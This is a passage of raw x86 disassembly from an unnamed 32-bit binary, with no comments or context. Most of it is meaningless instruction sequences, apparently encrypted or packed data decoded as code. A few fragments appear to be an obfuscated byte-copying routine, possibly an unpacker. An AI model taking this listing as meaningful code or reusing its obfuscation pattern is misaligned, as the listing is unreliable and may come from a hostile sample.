  40da29:	cmp    ch,BYTE PTR [esi]
  40da2b:	sbb    eax,0x1709b5e1
  40da30:	dec    ecx
  40da31:	and    ecx,DWORD PTR [eax+0x380c21b7]
  40da37:	or     BYTE PTR [eax+0x51f5c2c1],dh
  40da3d:	cli    
  40da3e:	push   0x45
  40da40:	jne    0x40da71
  40da42:	bound  eax,QWORD PTR [ebp+0x41]
  40da45:	cmp    BYTE PTR [edi-0x39],ch
  40da48:	fwait
  40da49:	retf   
  40da4a:	cmp    BYTE PTR [edx],ah
  40da4c:	mov    al,0x98
  40da4e:	hlt    
  40da4f:	mov    ebp,DWORD PTR [edx+0x42]
  40da52:	inc    edi
  40da53:	lods   eax,DWORD PTR ds:[esi]
  40da54:	ret    
  40da55:	ss push ss
  40da57:	mov    ah,0x90
  40da59:	aaa    
  40da5a:	pusha  
  40da5b:	jb     0x40da8f
  40da5d:	jecxz  0x40da44
  40da5f:	fistp  QWORD PTR ds:0x4a308f75
  40da65:	ret    0x4ad5
  40da68:	xchg   esp,eax
  40da69:	(bad)  
  40da6b:	aam    0x30
  40da6d:	not    DWORD PTR [ebx+0x49]
  40da70:	clc    
  40da71:	daa    
  40da72:	mov    esi,0x2d421abd
  40da77:	sbb    edi,DWORD PTR [ebp+ebx*4+0x3020e159]
  40da7e:	jbe    0x40da80
  40da80:	jp     0x40da4a
  40da82:	and    ebx,DWORD PTR [ebp-0x2f]
  40da85:	mov    BYTE PTR [edx-0x2c],bl
  40da88:	pop    esi
  40da89:	and    BYTE PTR [ebx+0x6c],ah
  40da8c:	jbe    0x40da8d
  40da8e:	add    ecx,DWORD PTR [ebp-0x11]
  40da91:	mov    ds:0x2325dff8,eax
  40da96:	mov    al,al
  40da98:	xchg   esi,eax
  40da99:	and    edx,esp
  40da9b:	adc    al,0x7b
  40da9d:	scas   eax,DWORD PTR es:[edi]
  40da9e:	leave  
  40da9f:	mov    ah,0x5c
  40daa1:	jno    0x40da7b
  40daa3:	pushf  
  40daa4:	sbb    BYTE PTR [edx+0x7e4d26b2],dh
  40daaa:	neg    BYTE PTR [ebp-0x2f]
  40daad:	call   0x3d54:0x5e228a45
  40dab4:	jecxz  0x40da9d
  40dab6:	icebp  
  40dab7:	cdq    
  40dab8:	pop    ds
  40dab9:	sub    eax,0xb8e7a22f
  40dabe:	mov    edi,0x2fccd94f
  40dac3:	jp     0x40db03
  40dac5:	(bad)  
  40dac6:	jmp    0x942:0xd60f19fe
  40dacd:	stos   DWORD PTR es:[edi],eax
  40dace:	xor    edx,ecx
  40dad0:	or     ah,BYTE PTR [eax]
  40dad2:	aam    0x11
  40dad4:	std    
  40dad5:	sbb    edi,esi
  40dad7:	xor    al,0x61
  40dad9:	inc    ecx
  40dada:	xchg   edx,eax
  40dadb:	sbb    DWORD PTR [edx],ecx
  40dadd:	fdiv   DWORD PTR [edx+0x30]
  40dae0:	in     al,dx
  40dae1:	or     eax,0xf6976a27
  40dae6:	xor    BYTE PTR [edi+0x32],al
  40dae9:	sahf   
  40daea:	loope  0x40daa0
  40daec:	jmp    0x40db48
  40daee:	mov    esp,0xf320c95e
  40daf3:	out    0x89,eax
  40daf5:	daa    
  40daf6:	push   esp
  40daf7:	jp     0x40dad1
  40daf9:	call   FWORD PTR [eax]
  40dafb:	jmp    0xb4dc:0x11813c75
  40db02:	push   ebx
  40db03:	neg    DWORD PTR ds:0x20ce0560
  40db09:	cdq    
  40db0a:	std    
  40db0b:	pop    edi
  40db0c:	stc    
  40db0d:	leave  
  40db0e:	dec    esp
  40db0f:	mov    bh,0xc7
  40db11:	mov    dh,ah
  40db13:	(bad)  
  40db14:	(bad)  
  40db16:	les    edx,FWORD PTR [esi-0xc]
  40db19:	mov    esi,0x7a381efb
  40db1e:	xor    DWORD PTR [ecx],ebp
  40db20:	inc    ebp
  40db21:	push   0x217e7b02
  40db26:	or     BYTE PTR [ebp+0x6b],0x65
  40db2a:	in     al,dx
  40db2b:	jo     0x40dafc
  40db2d:	(bad)  
  40db2f:	pop    edi
  40db30:	push   edi
  40db31:	lahf   
  40db32:	jmp    0xcf48f773
  40db37:	push   edi
  40db38:	scas   al,BYTE PTR es:[edi]
  40db39:	fisttp DWORD PTR [eax+0x5b]
  40db3c:	hlt    
  40db3d:	leave  
  40db3e:	call   0x6b0936d1
  40db43:	mov    eax,DWORD PTR ds:[ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dbbe
  40db97:	shl    DWORD PTR [ecx+0x70],0x5b
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [edi+0x3b2e2dbb],al
  40dba7:	xor    ch,BYTE PTR [eax]
  40dba9:	sub    dh,0x37
  40dbac:	cmp    cl,bl
  40dbae:	daa    
  40dbaf:	jno    0x40dbbe
  40dbb1:	in     eax,0x79
  40dbb3:	data16 cmp al,0xf
  40dbb6:	test   al,0xf0
  40dbb8:	pop    ds
  40dbb9:	add    cl,BYTE PTR [esi+0x66]
  40dbbc:	fnstsw WORD PTR [esi+ebp*2]
  40dbbf:	nop
  40dbc0:	or     al,0xbd
  40dbc2:	rcr    DWORD PTR [esi+edi*1+0x40],cl
  40dbc6:	mov    ah,0xa1
  40dbc8:	xchg   ecx,eax
  40dbc9:	fisub  DWORD PTR [eax+0x36]
  40dbcc:	popf   
  40dbcd:	cmp    DWORD PTR [ecx-0x4128be6a],eax
  40dbd3:	(bad)  
  40dbd5:	ins    DWORD PTR es:[edi],dx
  40dbd6:	jmp    0x592f4c2a
  40dbdb:	hlt    
  40dbdc:	outs   dx,DWORD PTR ds:[esi]
  40dbdd:	retf   
  40dbde:	add    eax,DWORD PTR es:[ebx+0x6a]
  40dbe2:	lds    esp,FWORD PTR [edx+ebp*4]
  40dbe5:	sbb    al,0x2a
  40dbe7:	mov    dl,0xab
  40dbe9:	or     al,BYTE PTR [edx]
  40dbeb:	cmp    ebx,DWORD PTR [ebx-0x29100c5d]
  40dbf1:	mov    bh,0xc2
  40dbf3:	ret    
  40dbf4:	jae    0x40dc39
  40dbf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbf7:	sbb    al,0x4f
  40dbf9:	retf   0x8c1a
  40dbfc:	shl    ebp,1
  40dbfe:	xchg   edx,eax
  40dbff:	stc    
  40dc00:	cli    
  40dc01:	mov    cl,BYTE PTR [edx]
  40dc03:	mov    al,ds:0xdc09841e
  40dc08:	inc    edi
  40dc09:	imul   esi,DWORD PTR [ebx-0x46],0x73
  40dc0d:	ins    BYTE PTR es:[edi],dx
  40dc0e:	rcl    esi,0xd6
  40dc11:	mov    cl,0x2a
  40dc13:	sub    DWORD PTR [ecx+0x23],ebp
  40dc16:	jnp    0x40dc87
  40dc18:	mov    DWORD PTR [edi+0x4427fefe],ebp
  40dc1e:	arpl   WORD PTR [eax-0x60],bp
  40dc21:	lods   al,BYTE PTR ds:[esi]
  40dc22:	mov    al,ds:0x6b730944
  40dc27:	mul    DWORD PTR [esi]
  40dc29:	out    0x22,eax
  40dc2b:	mov    dh,0x98
  40dc2d:	and    BYTE PTR [edx+0x13],0x88
  40dc31:	and    eax,0xdf713d0e
  40dc37:	int    0xe6
  40dc39:	test   eax,0xd049f9af
  40dc3e:	push   es
  40dc3f:	jmp    0x40dc2a
  40dc41:	test   DWORD PTR [edi+ebx*4+0xa],0x2bfd9aca
  40dc49:	repnz in eax,dx
  40dc4b:	mov    eax,ds:0xcecd0a8
  40dc50:	pop    es
  40dc51:	ss call 0xc9680550
  40dc57:	inc    eax
  40dc58:	add    BYTE PTR [edx-0x7158595],al
  40dc5e:	jae    0x40dc21
  40dc60:	fisttp DWORD PTR [esi+0x46530772]
  40dc66:	sbb    al,0xbf
  40dc68:	adc    cl,bl
  40dc6a:	sbb    ebx,DWORD PTR [esi]
  40dc6c:	fisttp WORD PTR [edi-0x4004f7f5]
  40dc72:	sub    DWORD PTR [ecx+eiz*4+0x47],edi
  40dc76:	mov    bl,0xd5
  40dc78:	out    dx,eax
  40dc79:	aam    0x55
  40dc7b:	lea    ecx,[edi-0x72fef3d4]
  40dc81:	inc    esp
  40dc82:	mov    ?,edi
  40dc84:	rcr    DWORD PTR ds:0xf26be673,1
  40dc8a:	xor    eax,0x9222c368
  40dc8f:	inc    edi
  40dc90:	inc    esi
  40dc91:	jns    0x40dc3d
  40dc93:	mov    eax,ds:0x692a525e
  40dc98:	mov    ah,bl
  40dc9a:	add    eax,0x7efd22e1
  40dc9f:	fld    TBYTE PTR [eax-0x5d]
  40dca2:	mov    eax,ds:0x16c24703
  40dca7:	mov    BYTE PTR [ecx-0x7c28bcc0],bh
  40dcad:	lods   al,BYTE PTR ds:[esi]
  40dcae:	imul   BYTE PTR [ecx]
  40dcb0:	fisub  WORD PTR [esi+0x45c127b1]
  40dcb6:	stc    
  40dcb7:	aaa    
  40dcb8:	mov    esp,0x7ef21c68
  40dcbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcbe:	es push 0x78
  40dcc1:	leave  
  40dcc2:	fcomp  QWORD PTR [ecx+0x372f1c6c]
  40dcc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcc9:	leave  
  40dcca:	loop   0x40dcee
  40dccc:	jp     0x40dcd1
  40dcce:	mov    ds:0x9315b6d9,eax
  40dcd3:	adc    DWORD PTR [ebx+0x5c],ebp
  40dcd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd7:	mov    WORD PTR [eax+ebx*1],ds
  40dcda:	jecxz  0x40dc62
  40dcdc:	adc    eax,0xb243d1af
  40dce1:	mov    eax,ds:0xbbbc0bfd
  40dce6:	movaps XMMWORD PTR [ebx+0x59],xmm5
  40dcea:	push   0x59c1151
  40dcef:	out    0x4b,al
  40dcf1:	je     0x40dcb1
  40dcf3:	pop    ebx
  40dcf4:	xor    ecx,esi
  40dcf6:	icebp  
  40dcf7:	mov    eax,ds:0xc0962f6b
  40dcfc:	sub    eax,0x49ed4cd4
  40dd01:	inc    esi
  40dd02:	dec    edx
  40dd03:	stc    
  40dd04:	ret    
  40dd05:	cmp    eax,0xa5914034
  40dd0a:	xchg   edi,eax
  40dd0b:	or     ch,cl
  40dd0d:	pop    ebp
  40dd0e:	jle    0x40dd02
  40dd10:	or     al,0x47
  40dd12:	xchg   ecx,eax
  40dd13:	push   es
  40dd14:	aaa    
  40dd15:	fwait
  40dd16:	xchg   BYTE PTR [esi],cl
  40dd18:	(bad)  
  40dd19:	imul   ecx,eax,0xd3afd192
  40dd1f:	push   0xffffffb4
  40dd21:	push   esp
  40dd22:	inc    esp
  40dd23:	cdq    
  40dd24:	lea    esi,gs:[ecx-0x74]
  40dd28:	clc    
  40dd29:	xor    al,0xd0
  40dd2b:	cmp    BYTE PTR [edx],bh
  40dd2d:	push   es
  40dd2e:	adc    al,0xca
  40dd30:	outs   dx,BYTE PTR ds:[esi]
  40dd31:	iret   
  40dd32:	ins    BYTE PTR es:[edi],dx
  40dd33:	js     0x40dcd1
  40dd35:	mov    al,ds:0x4e74c4f9
  40dd3a:	add    al,0x44
  40dd3c:	(bad)  
  40dd3d:	jns    0x40dd75
  40dd3f:	cld    
  40dd40:	test   DWORD PTR [edi],eax
  40dd42:	clc    
  40dd43:	mov    dl,0x64
  40dd45:	lods   al,BYTE PTR ds:[esi]
  40dd46:	add    eax,0x1a1fb155
  40dd4b:	inc    ebx
  40dd4c:	hlt    
  40dd4d:	mov    bh,0x6
  40dd4f:	jmp    DWORD PTR es:[esi+edi*8]
  40dd53:	add    ebx,DWORD PTR [edi+0x6f5205c1]
  40dd59:	adc    cl,al
  40dd5b:	dec    edx
  40dd5c:	cli    
  40dd5d:	cmp    BYTE PTR [esi+0x5f26f51a],dh
  40dd63:	je     0x40dd5b
  40dd65:	lods   al,BYTE PTR ds:[esi]
  40dd66:	mov    ss,WORD PTR [edx]
  40dd68:	sub    DWORD PTR [edx+esi*2+0x3727361e],edx
  40dd6f:	dec    eax
  40dd70:	jb     0x40ddb9
  40dd72:	dec    edx
  40dd74:	adc    eax,0xc248fc65
  40dd79:	mov    ecx,0x50e44ab8
  40dd7e:	jns    0x40dd7f
  40dd80:	inc    ebp
  40dd81:	push   0xd0407a2f
  40dd86:	lahf   
  40dd87:	shl    al,cl
  40dd89:	pop    es
  40dd8a:	sub    dl,BYTE PTR [ecx]
  40dd8c:	pushf  
  40dd8d:	sub    cl,ch
  40dd8f:	jb     0x40de02
  40dd91:	inc    ecx
  40dd92:	mov    DWORD PTR [edi+0x69],edx
  40dd95:	jbe    0x40de12
  40dd97:	sbb    dl,dl
  40dd99:	retf   0x62a
  40dd9c:	pop    es
  40dd9d:	pushf  
  40dd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd9f:	(bad)  
  40dda1:	sub    al,0xc4
  40dda3:	add    bh,BYTE PTR [esi+0x50]
  40dda6:	leave  
  40dda7:	call   0xd828:0xb5954673
  40ddae:	dec    esp
  40ddaf:	and    BYTE PTR [ecx],cl
  40ddb1:	in     eax,dx
  40ddb2:	dec    esp
  40ddb3:	jecxz  0x40de28
  40ddb5:	add    eax,0x84b8643e
  40ddba:	add    al,0x65
  40ddbc:	leave  
  40ddbd:	mov    eax,ds:0xfd955fe6
  40ddc2:	jle    0x40ddbc
  40ddc4:	jbe    0x40ddd2
  40ddc6:	push   eax
  40ddc7:	stc    
  40ddc8:	test   ah,0xe
  40ddcb:	in     al,dx
  40ddcc:	dec    ebx
  40ddcd:	mov    ds:0x65d771fe,eax
  40ddd2:	mov    bl,0x74
  40ddd4:	popa   
  40ddd5:	adc    al,0x1
  40ddd7:	add    bh,BYTE PTR [esi+0x5f]
  40ddda:	pop    es
  40dddb:	adc    edi,esi
  40dddd:	cli    
  40ddde:	jbe    0x40ddec
  40dde0:	sti    
  40dde1:	hlt    
  40dde2:	mov    eax,ds
  40dde4:	mov    es,WORD PTR [edx]
  40dde6:	fidivr DWORD PTR [ebp-0x45]
  40dde9:	pop    eax
  40ddea:	push   eax
  40ddeb:	sbb    ebx,DWORD PTR [eax-0x507b9ede]
  40ddf1:	mov    al,ds:0x4c600f1d
  40ddf6:	dec    esp
  40ddf7:	inc    esp
  40ddf8:	hlt    
  40ddf9:	ss movsx esi,sp
  40ddfd:	pop    ecx
  40ddfe:	dec    ecx
  40ddff:	(bad)
  40de02:	test   al,0x2
  40de04:	xor    ah,dh
  40de06:	xlat   BYTE PTR ds:[ebx]
  40de07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de08:	sbb    DWORD PTR [edx+0x6552fb5e],ecx
  40de0e:	adc    edx,DWORD PTR [ebp+0x6d]
  40de11:	dec    ecx
  40de12:	fcmovnbe st,st(4)
  40de14:	push   edx
  40de15:	xchg   edx,eax
  40de16:	jmp    0x170b174f
  40de1b:	fst    DWORD PTR [ebp-0x18a8d469]
  40de21:	jmp    0x40ddca
  40de23:	add    al,0x47
  40de25:	fist   DWORD PTR [ebx]
  40de27:	pop    esp
  40de28:	lahf   
  40de29:	ins    DWORD PTR es:[edi],dx
  40de2a:	mov    ah,0xa2
  40de2c:	pushf  
  40de2d:	aaa    
  40de2e:	sub    dh,cl
  40de30:	loopne 0x40dea2
  40de32:	add    DWORD PTR [ecx-0x80],ebx
  40de35:	jno    0x40de9b
  40de37:	sahf   
  40de38:	or     BYTE PTR [ecx+0x71],cl
  40de3b:	xchg   edx,eax
  40de3c:	daa    
  40de3d:	mov    ch,0x7
  40de3f:	imul   ebp,DWORD PTR [edx-0x30],0xffffffff
  40de43:	jae    0x40de1c
  40de45:	int3   
  40de46:	icebp  
  40de47:	dec    esp
  40de48:	cmp    al,0xc7
  40de4a:	inc    ebp
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422538
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40decb
  40deca:	xchg   esp,eax
  40decb:	gs mov esp,0x1818cc14
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    al,ah
  40ded6:	icebp  
  40ded7:	aas    
  40ded8:	fist   WORD PTR [edx-0x4298a0d3]
  40dede:	sub    DWORD PTR [edi],eax
  40dee0:	add    eax,0x95667435
  40dee5:	xchg   edx,eax
  40dee6:	iret   
  40dee7:	add    BYTE PTR [eax-0x77],cl
  40deea:	push   esi
  40deeb:	add    eax,0x9b309691
  40def0:	xor    ebx,DWORD PTR [ecx]
  40def2:	sub    eax,0x5a02de03
  40def7:	das    
  40def8:	scas   eax,DWORD PTR es:[edi]
  40def9:	ror    edi,0x7b
  40defc:	adc    esi,DWORD PTR [ebx+0x2f5b3119]
  40df02:	or     al,BYTE PTR [ecx+eiz*2-0x3ec318bc]
  40df09:	repz push ebx
  40df0b:	adc    DWORD PTR [ebp+eiz*4+0x66c486de],ebx
  40df12:	xchg   BYTE PTR ds:[edx+0x450e4fde],al
  40df19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df1a:	test   DWORD PTR [edx-0x6b],esi
  40df1d:	xchg   BYTE PTR [ebx],bh
  40df1f:	sti    
  40df20:	ret    
  40df21:	gs push ds
  40df23:	lea    esp,[esi-0x2d657db4]
  40df29:	jne    0x40dfa8
  40df2b:	das    
  40df2c:	pop    edi
  40df2d:	and    dl,BYTE PTR [edx]
  40df2f:	push   0xffffffb4
  40df31:	mov    DWORD PTR [edx-0x37075ac5],0x4638e14f
  40df3b:	sub    al,0xf
  40df3d:	(bad)  
  40df3e:	out    dx,al
  40df3f:	mov    ah,0x9d
  40df41:	mov    ah,0xbb
  40df43:	out    dx,al
  40df44:	xor    BYTE PTR [esi],0x26
  40df47:	(bad)  [esi-0x6e]
  40df4a:	xchg   esi,eax
  40df4b:	stos   DWORD PTR es:[edi],eax
  40df4c:	xor    edx,edx
  40df4e:	mov    ecx,0xa78ebe54
  40df53:	outs   dx,DWORD PTR ds:[esi]
  40df54:	ds dec edi
  40df56:	push   ss
  40df57:	jns    0x40df94
  40df59:	or     al,0xbc
  40df5b:	inc    ebx
  40df5d:	jb     0x40defe
  40df5f:	scas   al,BYTE PTR es:[edi]
  40df60:	popa   
  40df61:	daa    
  40df62:	mov    al,ds:0x2adb7294
  40df67:	mov    eax,0xdf1d772f
  40df6c:	jo     0x40df01
  40df6e:	push   esi
  40df6f:	mov    DWORD PTR [edx],eax
  40df71:	mov    ebp,0x65f1743e
  40df76:	or     BYTE PTR [edi],bh
  40df78:	(bad)  [edx]
  40df7a:	es call 0x92d0:0x4229f432
  40df82:	ins    BYTE PTR es:[edi],dx
  40df83:	xchg   esp,eax
  40df84:	lds    edi,FWORD PTR [ebx-0x66311908]
  40df8a:	(bad)  
  40df8b:	ja     0x40dfce
  40df8d:	inc    ecx
  40df8e:	jge    0x40dfab
  40df90:	sub    bh,bh
  40df92:	sbb    BYTE PTR [edi+edi*4],cl
  40df95:	call   0xf41a73eb
  40df9a:	xchg   esp,eax
  40df9b:	fisub  WORD PTR [esi]
  40df9d:	pushf  
  40df9e:	and    DWORD PTR [edi-0x577364a2],esp
  40dfa4:	xchg   ebp,eax
  40dfa5:	out    0xa0,al
  40dfa7:	(bad)  
  40dfa8:	pop    esi
  40dfa9:	cld    
  40dfaa:	pop    esp
  40dfab:	xchg   BYTE PTR [ebp+ecx*1+0x79116e31],ah
  40dfb2:	or     DWORD PTR [edx],ecx
  40dfb4:	jecxz  0x40df49
  40dfb6:	(bad)  
  40dfb7:	mov    eax,0xd75ee5e7
  40dfbc:	add    DWORD PTR [edx-0x3],0x7d69d4fe
  40dfc3:	pop    ss
  40dfc4:	and    al,0x6
  40dfc6:	dec    esp
  40dfc7:	cld    
  40dfc8:	jg     0x40df87
  40dfca:	fisubr WORD PTR [esi+0x2e6d0322]
  40dfd0:	jl     0x40e029
  40dfd2:	test   eax,0xa48570eb
  40dfd7:	mov    bl,0xac
  40dfd9:	sbb    esp,DWORD PTR [edx]
  40dfdb:	stc    
  40dfdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfdd:	imul   ebx,esi,0xdd7baf29
  40dfe3:	aas    
  40dfe4:	adc    esi,ebp
  40dfe6:	mov    ah,BYTE PTR [ebx+0x2b]
  40dfe9:	rcl    DWORD PTR [ebx+0x77b351d5],1
  40dfef:	mov    DWORD PTR [esi-0x60],esp
  40dff2:	jg     0x40dfdc
  40dff4:	pop    ds
  40dff5:	dec    ebp
  40dff6:	and    BYTE PTR [ebx-0x76],dh
  40dff9:	fcmovnb st,st(1)
  40dffb:	aam    0x7b
  40dffd:	loop   0x40dff5
  40dfff:	(bad)  [esi]
  40e001:	xor    DWORD PTR ds:0xb1a1b6fe,edi
  40e007:	inc    esp
  40e008:	imul   eax,DWORD PTR [ebx],0xfffffff4
  40e00b:	loopne 0x40e026
  40e00d:	les    edx,FWORD PTR [esi-0x4e]
  40e010:	hlt    
  40e011:	in     eax,0x90
  40e013:	push   gs
  40e015:	mov    al,0x9d
  40e017:	push   eax
  40e018:	sahf   
  40e019:	cmp    BYTE PTR [edx+0x7281ae3a],bl
  40e01f:	enter  0x230d,0xb1
  40e023:	in     eax,0xca
  40e025:	mov    eax,0xe7416d77
  40e02a:	jmp    0x133c:0xe80ec68a
  40e031:	leave  
  40e032:	lahf   
  40e033:	ss mov edi,0x7c62d9b7
  40e039:	aas    
  40e03a:	in     al,0x57
  40e03c:	das    
  40e03d:	ret    0xd6ea
  40e040:	inc    edi
  40e041:	dec    ebp
  40e042:	inc    ecx
  40e043:	mov    ds:0xb7d90941,al
  40e048:	sub    ah,BYTE PTR [edx]
  40e04a:	or     DWORD PTR [edi],ebp
  40e04c:	adc    DWORD PTR [edi-0x12],0xb57c90c5
  40e053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e054:	call   0xa64ae495
  40e059:	fcom   QWORD PTR [ebx]
  40e05b:	sbb    al,0xb0
  40e05d:	pop    ss
  40e05e:	mov    ch,al
  40e060:	iret   
  40e061:	pop    ebx
  40e062:	cmc    
  40e063:	jecxz  0x40e013
  40e065:	mov    dh,0x32
  40e067:	cld    
  40e068:	(bad)  
  40e06a:	call   0x10f882ac
  40e06f:	xor    DWORD PTR [edx+0x69c25d7f],esi
  40e075:	outs   dx,BYTE PTR ds:[esi]
  40e076:	push   edx
  40e077:	fimul  WORD PTR [ebp+0x49]
  40e07a:	out    dx,al
  40e07b:	loopne 0x40e0f6
  40e07d:	push   edx
  40e07e:	pop    ebp
  40e07f:	pop    esi
  40e080:	mov    ebp,0xef4c052c
  40e085:	rcl    BYTE PTR [eax],cl
  40e087:	enter  0x4959,0xdf
  40e08b:	stos   BYTE PTR es:[edi],al
  40e08c:	pop    ebx
  40e08d:	mov    eax,0xea0a881b
  40e092:	push   ebx
  40e093:	ja     0x40e108
  40e095:	mov    eax,ds:0x678d3d8
  40e09a:	rcl    DWORD PTR [ebp-0xf],cl
  40e09d:	add    eax,0xec0a6159
  40e0a2:	imul   ebx,DWORD PTR [esi],0x9e94da47
  40e0a8:	mov    edx,0xa2632411
  40e0ad:	imul   edx,DWORD PTR [ecx],0x21
  40e0b0:	das    
  40e0b1:	cmc    
  40e0b2:	and    DWORD PTR [edx+eax*2],ebx
  40e0b5:	jp     0x40e08f
  40e0b7:	mov    DWORD PTR [ebp-0x2b],ebp
  40e0ba:	test   al,0x20
  40e0bc:	arpl   cx,di
  40e0be:	push   esp
  40e0bf:	cmp    al,0xa
  40e0c1:	fdivr  QWORD PTR [ebx-0x3a]
  40e0c4:	imul   edi,DWORD PTR [ebx],0x728221aa
  40e0ca:	xchg   ebx,eax
  40e0cb:	test   DWORD PTR ds:0x5758b260,esp
  40e0d1:	push   ebp
  40e0d2:	aad    0x37
  40e0d4:	in     eax,0x2c
  40e0d6:	jne    0x40e146
  40e0d8:	adc    DWORD PTR [edx+0x116d45b],0x4f20d9da
  40e0e2:	adc    BYTE PTR [esi-0x5bad0f49],0x5c
  40e0e9:	rcl    DWORD PTR [ebx+0x555c9657],cl
  40e0ef:	loopne 0x40e108
  40e0f1:	cld    
  40e0f2:	les    ebp,FWORD PTR [esi-0x60]
  40e0f5:	fwait
  40e0f6:	push   es
  40e0f7:	inc    ecx
  40e0f8:	mov    ?,WORD PTR [esi]
  40e0fa:	sbb    ebp,ebp
  40e0fc:	xor    esi,DWORD PTR [ecx+0x75]
  40e0ff:	xchg   BYTE PTR [edi-0x496a0669],ah
  40e105:	sbb    ebp,DWORD PTR [esi+0x6c96eeca]
  40e10b:	(bad)  
  40e10c:	lods   al,BYTE PTR ds:[esi]
  40e10d:	push   ss
  40e10e:	cs push cs
  40e110:	pop    ss
  40e111:	xchg   ebx,eax
  40e112:	das    
  40e113:	dec    ebx
  40e114:	out    0x8c,al
  40e116:	lods   eax,DWORD PTR ds:[esi]
  40e117:	or     al,0xa4
  40e119:	bswap  ebp
  40e11b:	cdq    
  40e11c:	dec    esi
  40e11d:	imul   ecx,DWORD PTR [ebx+ebx*4-0x39],0xd58f0ba3
  40e125:	mov    bl,0x8
  40e127:	cli    
  40e128:	(bad)  
  40e129:	call   0x889d155b
  40e12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e12f:	jl     0x40e1a8
  40e131:	dec    edx
  40e132:	std    
  40e133:	mov    eax,DWORD PTR [ebx+esi*1]
  40e136:	mov    ecx,0x2478939e
  40e13b:	scas   al,BYTE PTR es:[edi]
  40e13c:	out    0x6f,eax
  40e13e:	push   esi
  40e13f:	sub    bh,BYTE PTR [ecx+0x13584261]
  40e145:	clc    
  40e146:	jmp    0xf19e:0x95cad2a4
  40e14d:	mov    esp,DWORD PTR [edx]
  40e14f:	test   DWORD PTR [edx-0x6c59fa74],ebp
  40e155:	mov    bh,0xfb
  40e157:	loope  0x40e198
  40e159:	sti    
  40e15a:	push   ebp
  40e15b:	(bad)  
  40e15c:	inc    bp
  40e15e:	(bad)  
  40e160:	sahf   
  40e161:	and    DWORD PTR [esp+ecx*2-0x545a31b9],edi
  40e168:	dec    ecx
  40e169:	add    eax,ecx
  40e16b:	shr    DWORD PTR [esp+ebp*8+0x26a7548a],1
  40e172:	jmp    0x40e116
  40e174:	xchg   esi,eax
  40e175:	mov    edx,0x61eda994
  40e17a:	mov    esp,0xf0458b0d
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1e1
  40e199:	pop    esi
  40e19a:	or     BYTE PTR [edx-0x32],ch
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    dh,bh
  40e1a5:	inc    esi
  40e1a6:	iret   
  40e1a7:	sub    BYTE PTR [eax-0x73],bl
  40e1aa:	fst    DWORD PTR [eax+0x3b]
  40e1ad:	sbb    esi,DWORD PTR [eax-0x51]
  40e1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b1:	jnp    0x40e172
  40e1b3:	pop    ds
  40e1b4:	jle    0x40e231
  40e1b6:	cmp    ch,ch
  40e1b8:	push   ecx
